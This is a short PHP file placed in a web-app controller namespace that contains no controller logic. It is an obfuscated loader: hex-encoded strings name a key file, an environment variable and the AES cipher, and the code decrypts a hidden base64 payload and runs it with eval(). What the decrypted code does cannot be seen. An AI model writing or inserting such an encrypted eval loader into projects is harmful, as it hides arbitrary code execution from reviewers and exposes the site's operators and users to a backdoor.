<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('izHVmqyHk6yzvhjAxaTobg==');

$c=base64_decode(

'etzFdwRDxRcQ+V5dbVuxathVDhVAeOeH9G9FPYB3MhLMECozsIG2aBrpNfj1iyhKcI7k9fSNqD6p' .
'xKO2izcMaQxJk+fylKY3sM7ljjGsgJAzGP4qw5LVFEdaaD8ZUhjGhlJa7M3ZLKFfIBG0vIwPu1pd' .
'HrGbJR5vTPlI/b1l4oTDKO9Nez8cZC/LzxhQk08TA7eH+Zuva+ovi3wp3RmfU4uYahnwQGwdmkQB' .
'ns6TqDZPGhV6NicN7HBcOtD5JXo7'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

